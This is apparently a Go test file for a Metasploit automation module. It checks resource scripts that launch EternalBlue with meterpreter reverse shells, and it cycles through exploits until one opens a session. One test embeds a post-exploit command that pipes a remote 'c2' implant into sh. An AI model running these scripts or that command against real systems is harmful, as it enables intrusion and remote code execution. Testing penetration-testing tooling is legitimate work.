package initialaccess

import (
	"context"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
)

func TestParseStringList(t *testing.T) {
	tests := []struct {
		name    string
		cfg     map[string]string
		key     string
		want    []string
		wantErr bool
	}{
		{"single string", map[string]string{"m": "exploit/x"}, "m", []string{"exploit/x"}, false},
		{"JSON array", map[string]string{"m": `["a","b","c"]`}, "m", []string{"a", "b", "c"}, false},
		{"empty", map[string]string{}, "m", nil, false},
		{"invalid JSON", map[string]string{"m": `[invalid`}, "m", nil, true},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, err := parseStringList(tt.cfg, tt.key)
			if (err != nil) != tt.wantErr {
				t.Fatalf("err = %v, wantErr = %v", err, tt.wantErr)
			}
			if len(got) != len(tt.want) {
				t.Fatalf("got %v, want %v", got, tt.want)
			}
			for i := range got {
				if got[i] != tt.want[i] {
					t.Fatalf("got[%d] = %q, want %q", i, got[i], tt.want[i])
				}
			}
		})
	}
}

func TestBuildMSFResourceScript(t *testing.T) {
	target := Target{Name: "win", Host: "10.0.0.5", Port: 445}
	opts := map[string]string{"THREADS": "10", "SMBUser": "admin"}

	rc := buildMSFResourceScript(target, "exploit/windows/smb/ms17_010_eternalblue",
		"windows/x64/meterpreter/reverse_tcp", "10.0.0.10", "4444", "0",
		opts, 20, "")

	checks := []string{
		"use exploit/windows/smb/ms17_010_eternalblue",
		"set RHOSTS 10.0.0.5",
		"set RPORT 445",
		"set LHOST 10.0.0.10",
		"set LPORT 4444",
		"set payload windows/x64/meterpreter/reverse_tcp",
		"set TARGET 0",
		"set SMBUser admin",
		"set THREADS 10",
		"exploit -j -z",
		"sleep 20",
		"sessions -l",
		"exit -y",
	}
	for _, c := range checks {
		if !strings.Contains(rc, c) {
			t.Errorf("resource script missing %q\nscript:\n%s", c, rc)
		}
	}
}

func TestBuildMSFResourceScript_NoPayload(t *testing.T) {
	target := Target{Host: "10.0.0.5", Port: 80}
	rc := buildMSFResourceScript(target, "exploit/x", "", "10.0.0.10", "4444",
		"", nil, 10, "")
	if strings.Contains(rc, "set payload") {
		t.Errorf("payload line should be absent:\n%s", rc)
	}
}

func TestBuildMSFResourceScript_PostExploit(t *testing.T) {
	target := Target{Host: "10.0.0.5", Port: 445}
	cmd := "curl http://c2/implant | sh"
	rc := buildMSFResourceScript(target, "exploit/x", "", "10.0.0.10", "4444",
		"", nil, 10, cmd)
	if !strings.Contains(rc, "run_single('curl http://c2/implant | sh')") {
		t.Errorf("post-exploit command not in script:\n%s", rc)
	}
}

func TestBuildMSFResourceScript_PostExploitEscape(t *testing.T) {
	target := Target{Host: "10.0.0.5", Port: 445}
	cmd := "echo 'it is' | sh"
	rc := buildMSFResourceScript(target, "exploit/x", "", "10.0.0.10", "4444",
		"", nil, 10, cmd)
	if !strings.Contains(rc, "run_single('echo \\'it is\\' | sh')") {
		t.Errorf("single quotes not escaped:\n%s", rc)
	}
}

func TestParseMSFSessionInfo(t *testing.T) {
	tests := []struct {
		name     string
		output   string
		wantOpen bool
		wantHost string
	}{
		{
			"meterpreter session",
			"[*] Meterpreter session 1 opened (10.0.0.10:4444 -> 10.0.0.5:49152)",
			true,
			"10.0.0.5",
		},
		{
			"shell session",
			"[*] Command shell session 2 opened",
			true,
			"",
		},
		{
			"exploit failed",
			"[-] Exploit failed\nThere are no active sessions.",
			false,
			"",
		},
		{
			"empty output",
			"",
			false,
			"",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			info := parseMSFSessionInfo(tt.output)
			if info.opened != tt.wantOpen {
				t.Errorf("opened = %v, want %v", info.opened, tt.wantOpen)
			}
			if info.hostname != tt.wantHost {
				t.Errorf("hostname = %q, want %q", info.hostname, tt.wantHost)
			}
		})
	}
}

func TestMetasploitModule_MissingConfig(t *testing.T) {
	m := &MetasploitModule{}
	tests := []struct {
		name string
		req  Request
		err  string
	}{
		{"no lhost", Request{Config: map[string]string{"module": "exploit/x"}}, "lhost"},
		{"no module", Request{Config: map[string]string{"lhost": "10.0.0.1"}}, "module"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := m.Run(context.Background(), tt.req)
			if err == nil {
				t.Fatal("expected error")
			}
			if !strings.Contains(err.Error(), tt.err) {
				t.Errorf("error %q does not contain %q", err.Error(), tt.err)
			}
		})
	}
}

func TestMetasploitModule_BadOptions(t *testing.T) {
	m := &MetasploitModule{}
	_, err := m.Run(context.Background(), Request{
		Config: map[string]string{
			"module":  "exploit/x",
			"lhost":   "10.0.0.1",
			"options": `{invalid`,
		},
	})
	if err == nil {
		t.Fatal("expected error for invalid options JSON")
	}
}

func TestMetasploitModule_RunSuccess(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("fake msfconsole test is unix-only")
	}
	fakeMSF := writeFakeMSF(t, fakeMSFSuccessScript)
	m := &MetasploitModule{}
	req := Request{
		Target: Target{Host: "10.0.0.5", Port: 445},
		Config: map[string]string{
			"msfconsole": fakeMSF,
			"module":     "exploit/windows/smb/ms17_010_eternalblue",
			"payload":    "windows/x64/meterpreter/reverse_tcp",
			"lhost":      "10.0.0.10",
			"lport":      "4444",
		},
	}
	res, err := m.Run(context.Background(), req)
	if err != nil {
		t.Fatalf("Run error: %v", err)
	}
	if !res.Ok {
		t.Fatalf("expected Ok=true, note: %s", res.Note)
	}
	if res.Hostname != "10.0.0.5" {
		t.Errorf("hostname = %q, want 10.0.0.5", res.Hostname)
	}
}

func TestMetasploitModule_RunFailure(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("fake msfconsole test is unix-only")
	}
	fakeMSF := writeFakeMSF(t, fakeMSFFailureScript)
	m := &MetasploitModule{}
	req := Request{
		Target: Target{Host: "10.0.0.5", Port: 445},
		Config: map[string]string{
			"msfconsole": fakeMSF,
			"module":     "exploit/windows/smb/ms17_010_eternalblue",
			"lhost":      "10.0.0.10",
		},
	}
	res, err := m.Run(context.Background(), req)
	if err != nil {
		t.Fatalf("Run error: %v", err)
	}
	if res.Ok {
		t.Fatal("expected Ok=false")
	}
}

func TestMetasploitModule_BruteForce(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("fake msfconsole test is unix-only")
	}
	fakeMSF := writeFakeMSF(t, fakeMSFBruteForceScript)
	m := &MetasploitModule{}
	req := Request{
		Target: Target{Host: "10.0.0.5", Port: 445},
		Config: map[string]string{
			"msfconsole": fakeMSF,
			"module":     `["exploit/fail_one", "exploit/success_two", "exploit/fail_three"]`,
			"lhost":      "10.0.0.10",
		},
	}
	res, err := m.Run(context.Background(), req)
	if err != nil {
		t.Fatalf("Run error: %v", err)
	}
	if !res.Ok {
		t.Fatalf("expected Ok=true, note: %s", res.Note)
	}
	if !strings.Contains(res.Note, "success_two") {
		t.Errorf("expected success on 'success_two', note: %s", res.Note)
	}
	if !strings.Contains(res.Note, "attempt 2 of 3") {
		t.Errorf("expected attempt 2 of 3, note: %s", res.Note)
	}
}

func TestMetasploitModule_BruteForcePayloads(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("fake msfconsole test is unix-only")
	}
	fakeMSF := writeFakeMSF(t, fakeMSFBruteForceScript)
	m := &MetasploitModule{}
	req := Request{
		Target: Target{Host: "10.0.0.5", Port: 445},
		Config: map[string]string{
			"msfconsole": fakeMSF,
			"module":     "exploit/success_two",
			"payload":    `["linux/x64/shell/reverse_tcp", "windows/x64/meterpreter/reverse_tcp"]`,
			"lhost":      "10.0.0.10",
		},
	}
	res, err := m.Run(context.Background(), req)
	if err != nil {
		t.Fatalf("Run error: %v", err)
	}
	if !res.Ok {
		t.Fatalf("expected Ok=true, note: %s", res.Note)
	}
	if !strings.Contains(res.Note, "shell/reverse_tcp") {
		t.Errorf("expected payload in note, note: %s", res.Note)
	}
	if !strings.Contains(res.Note, "attempt 1 of 2") {
		t.Errorf("expected attempt 1 of 2, note: %s", res.Note)
	}
}

func TestMetasploitModule_BruteForceAllFail(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("fake msfconsole test is unix-only")
	}
	fakeMSF := writeFakeMSF(t, fakeMSFBruteForceScript)
	m := &MetasploitModule{}
	req := Request{
		Target: Target{Host: "10.0.0.5", Port: 445},
		Config: map[string]string{
			"msfconsole": fakeMSF,
			"module":     `["exploit/fail_a", "exploit/fail_b"]`,
			"lhost":      "10.0.0.10",
		},
	}
	res, err := m.Run(context.Background(), req)
	if err != nil {
		t.Fatalf("Run error: %v", err)
	}
	if res.Ok {
		t.Fatal("expected Ok=false when all attempts fail")
	}
	if !strings.Contains(res.Note, "2 attempts failed") {
		t.Errorf("expected '2 attempts failed' in note: %s", res.Note)
	}
}

func TestMetasploitModule_BinaryNotFound(t *testing.T) {
	m := &MetasploitModule{}
	_, err := m.Run(context.Background(), Request{
		Config: map[string]string{
			"msfconsole": "/no/such/msfconsole-xyz",
			"module":     "exploit/x",
			"lhost":      "10.0.0.1",
		},
	})
	if err == nil {
		t.Fatal("expected error when msfconsole binary is not found")
	}
}

func TestMetasploitModule_StopOnSuccessFalse(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("fake msfconsole test is unix-only")
	}
	fakeMSF := writeFakeMSF(t, fakeMSFBruteForceScript)
	m := &MetasploitModule{}
	req := Request{
		Target: Target{Host: "10.0.0.5", Port: 445},
		Config: map[string]string{
			"msfconsole":      fakeMSF,
			"module":          `["exploit/success_one", "exploit/success_two"]`,
			"lhost":           "10.0.0.10",
			"stop_on_success": "false",
		},
	}
	res, err := m.Run(context.Background(), req)
	if err != nil {
		t.Fatalf("Run error: %v", err)
	}
	if !res.Ok {
		t.Fatalf("expected Ok=true, note: %s", res.Note)
	}
}

// --- fake msfconsole helpers ---

const fakeMSFSuccessScript = `#!/bin/sh
echo "[*] Meterpreter session 1 opened (10.0.0.10:4444 -> 10.0.0.5:49152)"
echo "Active sessions"
echo "  1  meterpreter x64/linux  uid=0 @ victim  10.0.0.10:4444 -> 10.0.0.5:49152"
exit 0
`

const fakeMSFFailureScript = `#!/bin/sh
echo "[-] Exploit failed"
echo "There are no active sessions."
exit 1
`

const fakeMSFBruteForceScript = `#!/bin/sh
RC=""
prev=""
for arg in "$@"; do
  if [ "$prev" = "-r" ]; then RC="$arg"; fi
  prev="$arg"
done
if grep -q "success" "$RC" 2>/dev/null; then
  echo "[*] Meterpreter session 1 opened (10.0.0.10:4444 -> 10.0.0.5:49152)"
  exit 0
else
  echo "[-] Exploit failed"
  exit 1
fi
`

func writeFakeMSF(t *testing.T, script string) string {
	t.Helper()
	dir := t.TempDir()
	path := filepath.Join(dir, "msfconsole")
	if err := os.WriteFile(path, []byte(script), 0755); err != nil {
		t.Fatal(err)
	}
	return path
}
